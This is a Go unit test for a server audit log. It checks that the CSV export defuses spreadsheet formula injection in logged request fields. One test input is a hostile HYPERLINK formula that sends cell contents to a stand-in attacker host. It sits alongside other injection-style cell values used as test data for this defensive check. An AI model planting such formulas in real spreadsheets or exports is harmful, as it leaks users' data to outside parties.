package serveraudit

import (
	"bytes"
	"encoding/csv"
	"testing"
	"time"
)

// go-server-1021-4: a chat:invoke client's rejected model name reaches the
// audit log; the CSV export must not hand it to a spreadsheet as a formula.
func TestWriteEventsCSVNeutralisesFormulaCells(t *testing.T) {
	formula := `=hyperlink("https://attacker.invalid/?"&a1,"open")`
	var buf bytes.Buffer
	if err := WriteEventsCSV(&buf, []Event{{
		Timestamp:      time.Date(2026, 10, 21, 10, 0, 0, 0, time.UTC),
		RequestID:      "@cmd",
		Kind:           "chat",
		Path:           "/v1/chat/completions",
		Status:         400,
		RequestedMode:  "+fast",
		RequestedModel: formula,
		Error:          "-1+1",
		WorkspaceID:    "\r=1",
		ActorUserID:    "\n=1+1",
		TargetRole:     "－1+1",
		CostUSD:        0.25,
	}}); err != nil {
		t.Fatal(err)
	}
	records, err := csv.NewReader(&buf).ReadAll()
	if err != nil || len(records) != 2 {
		t.Fatalf("records = %q, err = %v", records, err)
	}
	cell := make(map[string]string)
	for i, name := range records[0] {
		cell[name] = records[1][i]
	}
	for name, want := range map[string]string{
		"request_id":      "'@cmd",
		"kind":            "chat",
		"path":            "/v1/chat/completions",
		"requested_mode":  "'+fast",
		"requested_model": "'" + formula,
		"error":           "'-1+1",
		"workspace_id":    "'\r=1",
		"actor_user_id":   "'\n=1+1",
		"target_role":     "'－1+1",
		"status":          "400",
		"cost_usd":        "0.250000",
	} {
		if cell[name] != want {
			t.Errorf("%s = %q, want %q", name, cell[name], want)
		}
	}
}
